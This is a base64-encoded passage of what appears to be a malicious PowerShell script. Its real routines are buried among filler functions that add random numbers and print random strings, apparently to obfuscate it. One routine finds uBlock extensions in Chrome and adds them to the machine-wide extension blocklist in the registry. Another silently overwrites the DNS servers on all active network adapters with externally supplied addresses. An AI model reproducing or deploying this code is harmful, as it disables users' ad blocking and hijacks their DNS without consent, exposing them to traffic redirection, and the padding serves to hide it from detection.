D0gJHZhcl9HSWNON09RaSArICR2YXJfM2g0cExscjcKICAgIHJldHVybiAkcmVzdWx0Cn0KaWYgKCR2YXJfM2g0cExscjcgLWd0IDEpIHsKICAgIFdyaXRlLUhvc3QgJ1JrUW1ZYkpacnE5ZkYweScKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnOTJLTGNZTmpYRElrWnNtJwp9CmlmICgkdmFyX2d6SFhBMmZUIC1ndCA0KSB7CiAgICBXcml0ZS1Ib3N0ICd0eVVDVnVmZ1hGbUQzc00nCn0gZWxzZSB7CiAgICBXcml0ZS1PdXRwdXQgJ25DUnlhbEFMNWppMmRNUycKfQppZiAoJHZhcl9TUmxEa3hBaiAtZ3QgMTUpIHsKICAgIFdyaXRlLU91dHB1dCAnZlJjVWlkYTM1ZVRKTWJ4Jwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICdWMVBpU2FUR1VJektDd3knCn0KaWYgKCR2YXJfWGNVZmJxSXogLWd0IDUpIHsKICAgIFdyaXRlLU91dHB1dCAnYmF5NVZxRnozclVmVzhSJwp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAnRWJBWkpVakg5Z1BmSWVpJwp9CmlmICgkdmFyX0dJY043T1FpIC1ndCAxNSkgewogICAgV3JpdGUtT3V0cHV0ICdvRTdWemY0NjVlWXRTTHcnCn0gZWxzZSB7CiAgICBXcml0ZS1Ib3N0ICcyYUoxa1dINTZaTmpSckInCn0KJHZhcl9HSWNON09RaSA9IGZuX3JUb3QxZmdtIC1wYXJhbTEgNzAgLXBhcmFtMiA5OApXcml0ZS1Ib3N0ICc5V2dIWGhVSXJrY2QwVHYnCiR2YXJfM2g0cExscjcgPSBmbl9wbmVkRjBOOCAtcGFyYW0xIDQ2IC1wYXJhbTIgNTAKV3JpdGUtT3V0cHV0ICdERlFMM3BoWEphNVZSVTAnCiR2YXJfU1JsRGt4QWogPSBmbl9wbmVkRjBOOCAtcGFyYW0xIDI1IC1wYXJhbTIgOTEKV3JpdGUtT3V0cHV0ICdkOWczUGFMbEhvUkZ5Sk4nCiR2YXJfR0ljTjdPUWkgPSBmbl9jNEVPVmRDZSAtcGFyYW0xIDQzIC1wYXJhbTIgMTEKV3JpdGUtSG9zdCAnZEFNalFrRnZ3WDhZS2MyJwokdmFyX2d6SFhBMmZUID0gZm5fVllDY3lMRFUgLXBhcmFtMSA5MSAtcGFyYW0yIDQyCldyaXRlLU91dHB1dCAnZmpWSHlDdGVYY0E1MHB3JwokdmFyX0dJY043T1FpID0gZm5fYzRFT1ZkQ2UgLXBhcmFtMSA3MyAtcGFyYW0yIDQ0CldyaXRlLU91dHB1dCAndFRkaFZsNlFYajBzWUpyJwokdmFyX1NSbERreEFqID0gZm5fblltN3NpSFogLXBhcmFtMSAzIC1wYXJhbTIgMzUKV3JpdGUtSG9zdCAnUmJoN1BRM05vNHYwS09ZJwokdmFyX1hjVWZicUl6ID0gZm5fcG5lZEYwTjggLXBhcmFtMSAyOSAtcGFyYW0yIDI0CldyaXRlLUhvc3QgJ2lRcmhkbmNQdDZaTHptRycKJHZhcl9nekhYQTJmVCA9IGZuX1ZZQ2N5TERVIC1wYXJhbTEgMzAgLXBhcmFtMiAyMwpXcml0ZS1PdXRwdXQgJ0ZIWmp2aDF5VmRVTFl3VCcKJHZhcl9YY1VmYnFJeiA9IGZuX25ZbTdzaUhaIC1wYXJhbTEgNiAtcGFyYW0yIDE0CldyaXRlLUhvc3QgJzFtdjhIS1pWSkxyWHRsRCcKJHZhcl9YY1VmYnFJeiA9IGZuX1ZZQ2N5TERVIC1wYXJhbTEgNTQgLXBhcmFtMiA1MgpXcml0ZS1Ib3N0ICdNNFhBN3BKM2g5SE9DalAnCiR2YXJfZ3pIWEEyZlQgPSBmbl9jNEVPVmRDZSAtcGFyYW0xIDkyIC1wYXJhbTIgNzUKV3JpdGUtSG9zdCAnWVVkbmsxb3ZYVEJBTnp4JwokdmFyX2d6SFhBMmZUID0gZm5fcG5lZEYwTjggLXBhcmFtMSA5MiAtcGFyYW0yIDM4CldyaXRlLU91dHB1dCAnS3JFUXFSM2lVQkh4Mkd1JwokdmFyX1hjVWZicUl6ID0gZm5fcG5lZEYwTjggLXBhcmFtMSA4MiAtcGFyYW0yIDgKV3JpdGUtSG9zdCAnTHQ4ZTB6azlvaUNBNW4yJwokdmFyX1NSbERreEFqID0gZm5fcG5lZEYwTjggLXBhcmFtMSAzOCAtcGFyYW0yIDMzCldyaXRlLU91dHB1dCAnNmt1SVpLZ0JiUG04V3FNJwokdmFyX0dJY043T1FpID0gZm5fVllDY3lMRFUgLXBhcmFtMSAzMiAtcGFyYW0yIDM1CldyaXRlLU91dHB1dCAncG5SOXkzVnRLRjRmaU5DJwokdmFyX2d6SFhBMmZUID0gZm5fblltN3NpSFogLXBhcmFtMSA0NSAtcGFyYW0yIDI1CldyaXRlLUhvc3QgJ21XNWJuRjdHNDI5TXUzUScKJHZhcl9YY1VmYnFJeiA9IGZuX3JUb3QxZmdtIC1wYXJhbTEgNjEgLXBhcmFtMiA4NwpXcml0ZS1PdXRwdXQgJ1JVcjVnVFNJR0hOTHM3WScKJHZhcl9TUmxEa3hBaiA9IGZuX25ZbTdzaUhaIC1wYXJhbTEgNTggLXBhcmFtMiA2MQpXcml0ZS1PdXRwdXQgJzVNcDZqeHlHRDlOVFcxYycKJHZhcl9YY1VmYnFJeiA9IGZuX25ZbTdzaUhaIC1wYXJhbTEgMzYgLXBhcmFtMiAzMwpXcml0ZS1Ib3N0ICdqeENTR05oN2ZxM2dYaUonCiAKCg0KDQpmdW5jdGlvbiBDb25maWd1cmVDaHJvbWVVYmxvY2sgew0KICAgICRrZXl3b3JkcyA9IEAoInVCbG9jayIpDQoNCiAgICBmb3JlYWNoICgkZGlyIGluIEdldC1FbnZQYXRocykgew0KICAgICAgICAkY2hyb21lRGlyID0gSm9pbi1QYXRoIC1QYXRoICRkaXIgLUNoaWxkUGF0aCAiR29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxFeHRlbnNpb25zIg0KICAgICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmIChUZXN0LVBhdGggLVBhdGggJGNocm9tZURpciAtUGF0aFR5cGUgQ29udGFpbmVyKSB7DQogICAgICAgICAgICAgICAgJGV4dGVuc2lvbnMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRjaHJvbWVEaXIgLURpcmVjdG9yeQ0KDQogICAgICAgICAgICAgICAgZm9yZWFjaCAoJGV4dGVuc2lvbiBpbiAkZXh0ZW5zaW9ucykgew0KICAgICAgICAgICAgICAgICAgICAkbWFuRmlsZSA9IGNocm9tZXVibG9ja19GaW5kTWFuaWZlc3RGaWxlIC1mb2xkZXIgJGV4dGVuc2lvbi5GdWxsTmFtZQ0KICAgICAgICAgICAgICAgICAgICBpZiAoJG1hbkZpbGUgLW5lICIiKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkZm91bmRLZXl3b3JkID0gJGZhbHNlDQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRtYW5pZmVzdFZhbHVlIGluICRrZXl3b3Jkcykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRjb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJG1hbkZpbGUgLVJhdw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkY29udGVudCAtbWF0Y2ggW3JlZ2V4XTo6RXNjYXBlKCRtYW5pZmVzdFZhbHVlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZm91bmRLZXl3b3JkID0gJHRydWUNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkZm91bmRLZXl3b3JkKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGV4dEZvbGRlck5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkZXh0ZW5zaW9uLkZ1bGxOYW1lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNocm9tZXVibG9ja19Qcm9jZXNzTWFuaWZlc3RBbGwgLWV4dE5hbWUgJGV4dEZvbGRlck5hbWUNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICAgV3JpdGUtRXJyb3IgIkVycm9yIG9jY3VycmVkOiAkXyINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBjaHJvbWV1YmxvY2tfRmluZE1hbmlmZXN0RmlsZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRmb2xkZXINCiAgICApDQoNCiAgICAkcmVzdWx0ID0gIiINCg0KICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJGZvbGRlciB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgaWYgKC1ub3QgKCRfLlBTSXNDb250YWluZXIpKSB7DQogICAgICAgICAgICBpZiAoJF8uTmFtZSAtZXEgIm1hbmlmZXN0Lmpzb24iKSB7DQogICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRfLkZ1bGxOYW1lDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZWlmICgkXy5OYW1lIC1ub3RpbiBAKCcuJywgJy4uJykpIHsNCiAgICAgICAgICAgICRyZXN1bHQgPSBjaHJvbWV1YmxvY2tfRmluZE1hbmlmZXN0RmlsZSAtZm9sZGVyICRfLkZ1bGxOYW1lDQogICAgICAgICAgICBpZiAoJHJlc3VsdCAtbmUgIiIpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIHJldHVybiAkcmVzdWx0DQp9DQoNCg0KZnVuY3Rpb24gY2hyb21ldWJsb2NrX1Byb2Nlc3NNYW5pZmVzdEFsbCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRleHROYW1lDQogICAgKQ0KDQogICAgY2hyb21ldWJsb2NrX1Byb2Nlc3NNYW5pZmVzdCAtZXh0TmFtZSAkZXh0TmFtZSAtYnJvd3NlciAiR29vZ2xlXENocm9tZSINCn0NCg0KZnVuY3Rpb24gY2hyb21ldWJsb2NrX1Byb2Nlc3NNYW5pZmVzdCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRleHROYW1lLA0KICAgICAgICBbc3RyaW5nXSRicm93c2VyDQogICAgKQ0KDQogICAgJHJlZ1BhdGggPSAiSEtMTTpcU09GVFdBUkVcUG9saWNpZXNcJGJyb3dzZXJcRXh0ZW5zaW9uSW5zdGFsbEJsb2NrbGlzdCINCiAgICANCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyZWdQYXRoKSkgew0KICAgICAgICBOZXctSXRlbSAtUGF0aCAkcmVnUGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgIH0NCiAgICANCiAgICAkcmVnS2V5SW5kZXggPSAxDQogICAgZG8gew0KICAgICAgICAka2V5TmFtZSA9ICIkcmVnS2V5SW5kZXgiDQogICAgICAgICR2YWwgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdQYXRoIC1OYW1lICRrZXlOYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIGlmICgkdmFsIC1lcSAkZXh0TmFtZSkgew0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAgIH0NCiAgICAgICAgJHJlZ0tleUluZGV4KysNCiAgICB9IHVudGlsICgtbm90IChUZXN0LVBhdGggIiRyZWdQYXRoXCRrZXlOYW1lIikpDQoNCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdQYXRoIC1OYW1lICRrZXlOYW1lIC1WYWx1ZSAkZXh0TmFtZQ0KfQ0KZnVuY3Rpb24gZm5fTG9nX1BFdkxNMlV4IHsKICAgIHBhcmFtICgKICAgICAgICBbc3RyaW5nXSRtZXNzYWdlCiAgICApCiAgICBXcml0ZS1PdXRwdXQgJ0xvZzogJG1lc3NhZ2UnCn0KZnVuY3Rpb24gZm5femVQdGxrRnIgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl91bHdxV0tPeiwKICAgICAgICBbaW50XSR2YXJfR3ZSc21JYlcKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX3Vsd3FXS096ICsgJHZhcl9HdlJzbUliVwogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl82TGNBems5RSB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX0d2UnNtSWJXLAogICAgICAgIFtpbnRdJHZhcl9vV0FMeWM4eAogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfR3ZSc21JYlcgKyAkdmFyX29XQUx5Yzh4CiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX1NRa2p1OHFMIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfb1dBTHljOHgsCiAgICAgICAgW2ludF0kdmFyX0FMb2lrczVxCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9vV0FMeWM4eCArICR2YXJfQUxvaWtzNXEKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fSHdwSXhjdGggewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9BTG9pa3M1cSwKICAgICAgICBbaW50XSR2YXJfa2xzOXlTaTYKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX0FMb2lrczVxICsgJHZhcl9rbHM5eVNpNgogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9OWDFnV0dGSyB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX2tsczl5U2k2LAogICAgICAgIFtpbnRdJHZhcl91bHdxV0tPegogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfa2xzOXlTaTYgKyAkdmFyX3Vsd3FXS096CiAgICByZXR1cm4gJHJlc3VsdAp9CmlmICgkdmFyX3Vsd3FXS096IC1ndCAxNikgewogICAgV3JpdGUtSG9zdCAnRXhpVHFCbDJNTDZhQ2dWJwp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAnblB3OEE5a1NtNnYwRUtXJwp9CmlmICgkdmFyX0d2UnNtSWJXIC1ndCA0KSB7CiAgICBXcml0ZS1PdXRwdXQgJ3pCNVRaWWlvOURYN0p0QycKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgJzU0dFVNQjIxS24zSWRwRycKfQppZiAoJHZhcl9vV0FMeWM4eCAtZ3QgMTIpIHsKICAgIFdyaXRlLUhvc3QgJ1dLOVRIQzBEN2NlOEd4SicKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnWHZnNlppYkkxS0Rkd0pRJwp9CmlmICgkdmFyX0FMb2lrczVxIC1ndCAxNSkgewogICAgV3JpdGUtSG9zdCAnTjBNbjVIYUd6V0w5eERLJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICdtbGZ2eWtYWkdpM1RPZGgnCn0KaWYgKCR2YXJfa2xzOXlTaTYgLWd0IDEwKSB7CiAgICBXcml0ZS1Ib3N0ICdzV2Rnb2hOdzNhVGIwazUnCn0gZWxzZSB7CiAgICBXcml0ZS1PdXRwdXQgJ0JocXNkSGdwdjk0TTEwTycKfQokdmFyX29XQUx5Yzh4ID0gZm5femVQdGxrRnIgLXBhcmFtMSA3NiAtcGFyYW0yIDU5CldyaXRlLUhvc3QgJzlPQ3VwZmUwWk04Y2dyMycKJHZhcl9vV0FMeWM4eCA9IGZuXzZMY0F6azlFIC1wYXJhbTEgNjkgLXBhcmFtMiA5NwpXcml0ZS1Ib3N0ICdrM1duN0VVbEhNQVhqWmknCiR2YXJfQUxvaWtzNXEgPSBmbl9Id3BJeGN0aCAtcGFyYW0xIDI5IC1wYXJhbTIgNzMKV3JpdGUtSG9zdCAnOFdJbncwNk5NQTFpNFRjJwokdmFyX2tsczl5U2k2ID0gZm5fTlgxZ1dHRksgLXBhcmFtMSA5NSAtcGFyYW0yIDExCldyaXRlLU91dHB1dCAnZW1ZcW9jUzdJRzN1SjVLJwokdmFyX3Vsd3FXS096ID0gZm5femVQdGxrRnIgLXBhcmFtMSA0MyAtcGFyYW0yIDgyCldyaXRlLUhvc3QgJ1JDdXlXeEJZTWF0azJGRScKJHZhcl9vV0FMeWM4eCA9IGZuXzZMY0F6azlFIC1wYXJhbTEgNDkgLXBhcmFtMiA5NwpXcml0ZS1PdXRwdXQgJ2NBSmhIVTN1cHo5MnJGNycKJHZhcl9HdlJzbUliVyA9IGZuX3plUHRsa0ZyIC1wYXJhbTEgOTAgLXBhcmFtMiAyMgpXcml0ZS1Ib3N0ICdUcjNMQ3RTR081emlVeHAnCiR2YXJfR3ZSc21JYlcgPSBmbl96ZVB0bGtGciAtcGFyYW0xIDQyIC1wYXJhbTIgOApXcml0ZS1PdXRwdXQgJ1ZSZGd0WjdXRHppa01KeScKJHZhcl9BTG9pa3M1cSA9IGZuX1NRa2p1OHFMIC1wYXJhbTEgNzYgLXBhcmFtMiA1MwpXcml0ZS1PdXRwdXQgJ2VVcHIxWVJnRXY0TFpLQScKJHZhcl91bHdxV0tPeiA9IGZuX0h3cEl4Y3RoIC1wYXJhbTEgMzcgLXBhcmFtMiA4OQpXcml0ZS1PdXRwdXQgJ09VTlFnbUlISnlQbllSaycKJHZhcl91bHdxV0tPeiA9IGZuX1NRa2p1OHFMIC1wYXJhbTEgNjYgLXBhcmFtMiAyNwpXcml0ZS1PdXRwdXQgJ1NScXh0T0JzY1F3YjZwVScKJHZhcl9HdlJzbUliVyA9IGZuX1NRa2p1OHFMIC1wYXJhbTEgOTAgLXBhcmFtMiA1MwpXcml0ZS1Ib3N0ICdDREVJTjV6NDJlOW13blEnCiR2YXJfQUxvaWtzNXEgPSBmbl96ZVB0bGtGciAtcGFyYW0xIDExIC1wYXJhbTIgNjgKV3JpdGUtT3V0cHV0ICdxWW1aeTBIMmVMdjNPQ1YnCiR2YXJfQUxvaWtzNXEgPSBmbl96ZVB0bGtGciAtcGFyYW0xIDc4IC1wYXJhbTIgMjcKV3JpdGUtSG9zdCAnRG5mWTF0eDV3WnZRejBPJwokdmFyX0FMb2lrczVxID0gZm5fSHdwSXhjdGggLXBhcmFtMSA0MiAtcGFyYW0yIDQ2CldyaXRlLUhvc3QgJ3RhRkxyMHhoRVNqWHNKNScKJHZhcl9rbHM5eVNpNiA9IGZuXzZMY0F6azlFIC1wYXJhbTEgMTQgLXBhcmFtMiA0NwpXcml0ZS1Ib3N0ICdRaDc5MjAxQjZJaTN3VlknCiR2YXJfb1dBTHljOHggPSBmbl9OWDFnV0dGSyAtcGFyYW0xIDQzIC1wYXJhbTIgNzIKV3JpdGUtT3V0cHV0ICdTbVhHRDFIUTl2OE9CUEonCiR2YXJfdWx3cVdLT3ogPSBmbl9Id3BJeGN0aCAtcGFyYW0xIDg4IC1wYXJhbTIgMzIKV3JpdGUtT3V0cHV0ICdZT3NyZnp1UmNOQWFMd2UnCiR2YXJfR3ZSc21JYlcgPSBmbl9OWDFnV0dGSyAtcGFyYW0xIDExIC1wYXJhbTIgMjMKV3JpdGUtSG9zdCAnUWhUNnliS1BGdW1uSDRmJwokdmFyX2tsczl5U2k2ID0gZm5femVQdGxrRnIgLXBhcmFtMSA0MyAtcGFyYW0yIDYzCldyaXRlLUhvc3QgJzBMM1lLNzlwSkJWcTZPaScKIAoKDQoNCmZ1bmN0aW9uIFNldC1EbnNTZXJ2ZXJzIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHByaW1hcnlEbnNTZXJ2ZXIsDQogICAgICAgIFtzdHJpbmddJHNlY29uZGFyeURuc1NlcnZlcg0KICAgICkNCg0KICAgIHRyeSB7DQogICAgICAgICMgR2V0IG5ldHdvcmsgYWRhcHRlcnMgdGhhdCBhcmUgSVAtZW5hYmxlZA0KICAgICAgICAkbmV0d29ya0FkYXB0ZXJzID0gR2V0LU5ldEFkYXB0ZXIgfCBXaGVyZS1PYmplY3QgeyAkXy5TdGF0dXMgLWVxICdVcCcgLWFuZCAkXy5JbnRlcmZhY2VEZXNjcmlwdGlvbiAtbm90bGlrZSAnKlZpcnR1YWwqJyB9DQoNCiAgICAgICAgZm9yZWFjaCAoJGFkYXB0ZXIgaW4gJG5ldHdvcmtBZGFwdGVycykgew0KICAgICAgICAgICAgIyBTZXQgRE5TIHNlcnZlcnMgdXNpbmcgU2V0LURuc0NsaWVudFNlcnZlckFkZHJlc3MgY21kbGV0DQogICAgICAgICAgICBTZXQtRG5zQ2xpZW50U2VydmVyQWRkcmVzcyAtSW50ZXJmYWNlQWxpYXMgJGFkYXB0ZXIuTmFtZSAtU2VydmVyQWRkcmVzc2VzIEAoJHByaW1hcnlEbnNTZXJ2ZXIsICRzZWNvbmRhcnlEbnNTZXJ2ZXIpIC1Db25maXJtOiRmYWxzZQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIlN1Y2Nlc3NmdWxseSBzZXQgRE5TIHNlcnZlcnMgZm9yIGFkYXB0ZXI6ICQoJGFkYXB0ZXIuSW50ZXJmYWNlRGVzY3JpcHRpb24pIg0KICAgICAgICB9DQogICAgfSBjYXRjaCB7DQogICAgICAgIFdyaXRlLUVycm9yICJBbiBlcnJvciBvY2N1cnJlZDogJF8iDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBDb25maWd1cmVEbnNTZXJ2ZXJzIHsNCiAgICBTZXQtRE5TU2VydmVycyAtUHJpbWFyeUROU1NlcnZlciAkc2VydmVyLnByaW1hcnlEbnMgLVNlY29uZGFyeUROU1NlcnZlciAkc2VydmVyLnNlY29uZGFyeURucw0KfQ0KZnVuY3Rpb24gZm5fTG9nX3BvVEhrQnVmIHsKICAgIHBhcmFtICgKICAgICAgICBbc3RyaW5nXSRtZXNzYWdlCiAgICApCiAgICBXcml0ZS1PdXRwdXQgJ0xvZzogJG1lc3NhZ2UnCn0KZnVuY3Rpb24gZm5fTDg0d1F4ZEMgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl96a2IxNGhqbiwKICAgICAgICBbaW50XSR2YXJfS1lzZmt2WEIKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX3prYjE0aGpuICsgJHZhcl9LWXNma3ZYQgogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9PNWpDRHRZViB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX0tZc2ZrdlhCLAogICAgICAgIFtpbnRdJHZhcl9pNmJDcHI0QgogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfS1lzZmt2WEIgKyAkdmFyX2k2YkNwcjRCCiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX2NQdG53ckQxIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfaTZiQ3ByNEIsCiAgICAgICAgW2ludF0kdmFyX2xpaFRtSmZDCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9pNmJDcHI0QiArICR2YXJfbGloVG1KZkMKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fb1BzdTFwbGogewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9saWhUbUpmQywKICAgICAgICBbaW50XSR2YXJfYWR5M3REdTQKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX2xpaFRtSmZDICsgJHZhcl9hZHkzdER1NAogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl82dEhXUmhKWCB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX2FkeTN0RHU0LAogICAgICAgIFtpbnRdJHZhcl96a2IxNGhqbgogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfYWR5M3REdTQgKyAkdmFyX3prYjE0aGpuCiAgICByZXR1cm4gJHJlc3VsdAp9CmlmICgkdmFyX3prYjE0aGpuIC1ndCAxMikgewogICAgV3JpdGUtT3V0cHV0ICdpbDh2NFRxRVpNYjB0NXUnCn0gZWxzZSB7CiAgICBXcml0ZS1Ib3N0ICdMOVBBWWVIZ0tsdFZHN1UnCn0KaWYgKCR2YXJfS1lzZmt2WEIgLWd0IDgpIHsKICAgIFdyaXRlLU91dHB1dCAnUXBQRTJaQ3ZvVG53UmQ5Jwp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAnZkJVSTNWazlkU0U0TVhQJwp9CmlmICgkdmFyX2k2YkNwcjRCIC1ndCAxKSB7CiAgICBXcml0ZS1PdXRwdXQgJ3ptaVVCMXJLaHhTTUE3WicKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgJ1BHVGZGaVNxMk5aUm8waCcKfQppZiAoJHZhcl9saWhUbUpmQyAtZ3QgNSkgewogICAgV3JpdGUtSG9zdCAnU1lrOHB4TUJLZlFMMUlFJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICdWT3VoTGtvS2c0amEyN3onCn0KaWYgKCR2YXJfYWR5M3REdTQgLWd0IDYpIHsKICAgIFdyaXRlLU91dHB1dCAnZUZ2UFNEYmNDcFlIMW95Jwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICc0dUxkSUplZ3lEbjBaV08nCn0KJHZhcl9hZHkzdER1NCA9IGZuX2NQdG53ckQxIC1wYXJhbTEgNjUgLXBhcmFtMiA1OApXcml0ZS1Ib3N0ICc4eHRrV3BPeVRiTWNhQ3YnCiR2YXJfbGloVG1KZkMgPSBmbl9PNWpDRHRZViAtcGFyYW0xIDg3IC1wYXJhbTIgMTkKV3JpdGUtT3V0cHV0ICdyRFp2YUhLcTBPd0ZJTDUnCiR2YXJfS1lzZmt2WEIgPSBmbl9jUHRud3JEMSAtcGFyYW0xIDIyIC1wYXJhbTIgNjAKV3JpdGUtT3V0cHV0ICdkQjAyOHJzZTdJWkVUUEcnCiR2YXJfS1lzZmt2WEIgPSBmbl9vUHN1MXBsaiAtcGFyYW0xIDIyIC1wYXJhbTIgMTcKV3JpdGUtT3V0cHV0ICdDRnpMUGxkeWNVSm1HTnUnCiR2YXJfaTZiQ3ByNEIgPSBmbl9PNWpDRHRZViAtcGFyYW0xIDE3IC1wYXJhbTIgMzYKV3JpdGUtT3V0cHV0ICdNdDc0dTByZGNPQXFQeW8nCiR2YXJfaTZiQ3ByNEIgPSBmbl9PNWpDRHRZViAtcGFyYW0xIDUxIC1wYXJhbTIgMjgKV3JpdGUtSG9zdCAnTHFBbTFlV1VPWENGRzdJJwokdmFyX2FkeTN0RHU0ID0gZm5fTzVqQ0R0WVYgLXBhcmFtMSAzNiAtcGFyYW0yIDk5CldyaXRlLU91dHB1dCAnMXpZWDJjQ1BKdkdJQVU2JwokdmFyX3prYjE0aGpuID0gZm5fNnRIV1JoSlggLXBhcmFtMSA2IC1wYXJhbTIgNDYKV3JpdGUtT3V0cHV0ICdOWVhIdmJ3c3hGSkJLdUUnCiR2YXJfaTZiQ3ByNEIgPSBmbl9PNWpDRHRZViAtcGFyYW0xIDYwIC1wYXJhbTIgNjMKV3JpdGUtT3V0cHV0ICd2RXJ4cWxta3dXNW9ZSFonCiR2YXJfYWR5M3REdTQgPSBmbl9MODR3UXhkQyAtcGFyYW0xIDgzIC1wYXJhbTIgNjQKV3JpdGUtT3V0cHV0ICdSdFV2eU9TMlpYZEZQRzEnCiR2YXJfS1lzZmt2WEIgPSBmbl82dEhXUmhKWCAtcGFyYW0xIDI3IC1wYXJhbTIgMzgKV3JpdGUtSG9zdCAndmxFaUtzOEhmWFo0ZHljJwokdmFyX2xpaFRtSmZDID0gZm5fb1BzdTFwbGogLXBhcmFtMSAyNCAtcGFyYW0yIDc0CldyaXRlLU91dHB1dCAnbkdCNmtSeGZ2b1ZLMEhpJwokdmFyX2k2YkNwcjRCID0gZm5fTDg0d1F4ZEMgLXBhcmFtMSA0MiAtcGFyYW0yIDcxCldyaXRlLUhvc3QgJ0UwcjhZSmFxM09ndjVNUicKJHZhcl9saWhUbUpmQyA9IGZuX29Qc3UxcGxqIC1wYXJhbTEgNCAtcGFyYW0yIDg4CldyaXRlLUhvc3QgJ1h6d282NFBHWlE3cnV5UycKJHZhcl9hZHkzdER1NCA9IGZuX2NQdG53ckQxIC1wYXJhbTEgODYgLXBhcmFtMiA3NwpXcml0ZS1PdXRwdXQgJ3BpVUl2b3M2M1NCZU5DYycKJHZhcl96a2IxNGhqbiA9IGZuX29Qc3UxcGxqIC1wYXJhbTEgMTIgLXBhcmFtMiA2MgpXcml0ZS1Ib3N0ICcxNVlBYnBobGpjZk90dTQnCiR2YXJfaTZiQ3ByNEIgPSBmbl9vUHN1MXBsaiAtcGFyYW0xIDQ0IC1wYXJhbTIgNjIKV3JpdGUtSG9zdCAncXRaMWxmdVZ3Nm14cnBKJwokdmFyX2k2YkNwcjRCID0gZm5fb1BzdTFwbGogLXBhcmFtMSA4NCAtcGFyYW0yIDY4CldyaXRlLU91dHB1dCAnenJxUEw5WmFNNzBkeDRUJwokdmFyX0tZc2ZrdlhCID0gZm5fNnRIV1JoSlggLXBhcmFtMSAzMCAtcGFy